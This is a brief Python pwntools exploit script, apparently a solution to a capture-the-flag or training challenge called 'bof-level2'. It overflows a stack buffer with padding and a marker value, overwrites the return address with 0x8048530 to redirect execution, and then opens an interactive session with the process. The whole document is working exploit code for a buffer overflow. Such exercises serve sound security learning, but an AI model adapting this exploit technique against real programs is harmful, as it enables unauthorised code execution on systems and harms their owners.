#!/usr/bin/env python

from pwn import *

context.terminal = "/bin/bash"

p = process("./bof-level2")
# gdb.attach(p)

buffer = "A" * 0x14
buffer += "ABCDEFGH"
buffer += "A" * 0x8

buffer += p32(0x8048530)

p.sendline(buffer)

p.interactive()
